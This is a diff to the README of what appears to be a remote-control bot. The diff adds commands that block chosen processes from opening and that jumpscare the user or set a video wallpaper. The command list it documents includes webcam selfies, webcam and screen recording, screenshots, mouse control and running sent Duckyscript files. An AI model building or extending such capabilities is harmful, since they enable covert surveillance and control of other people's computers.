@@ -13,9 +13,11 @@ selphie - Take a webcam selfie.
 shutdown - Shut down the PC.  
 duckyhelp - Show Duckyscript tutorial.  
 jumpscare - Show random jumpscare.  
+jumpscarenoaudio - Jumpscare no audio.
 screenshot - Capture screen.  
 fullclip - Record screen + webcam.  
 plankton - Plankton.
+planktonnoaudio - Plankton no audio.
 gabinetti - Gabinetti nella villa.
 webcamclip - Record webcam.  
 screenclip - Record screen.  
@@ -42,15 +44,19 @@ mousecontroller - Sends a mouse controlling menu.
 mute - Set computer's volume to 0.
 full - Set computer's volume to 100.
 tralalerotralala - Plays italian brainrot.
+cantopenadd - Adds process to cantopenlist.
+cantopenremove - Removes process from cantopenlist.
+cantopenmenu - Displays processes on cantopenlist, clicking them will remove them.
+clear - Removes all cv2 windows, closes webcam and removes temporary files.
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
+*sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).
 *sending an audio/voice* - Will play the audio/voice in the background.
 *sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)
 You can run multiple commands at the same time by sending them in the same message but separated by a comma.
 For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
 jumpscare while recording screen and webcam
 ```
-
 ## Features
 - Screen Recording: Record the screen for a specified duration.
 - Webcam Recording: Record video from the webcam.
@@ -61,7 +67,6 @@ jumpscare while recording screen and webcam
 - Screenshot Capture: Take screenshots of the system.
 - Message Boxes: Display custom message boxes on the system.
 - System Control: Simulate system shutdowns or other actions.
-
 ## Installation
 1. Clone the repository
 
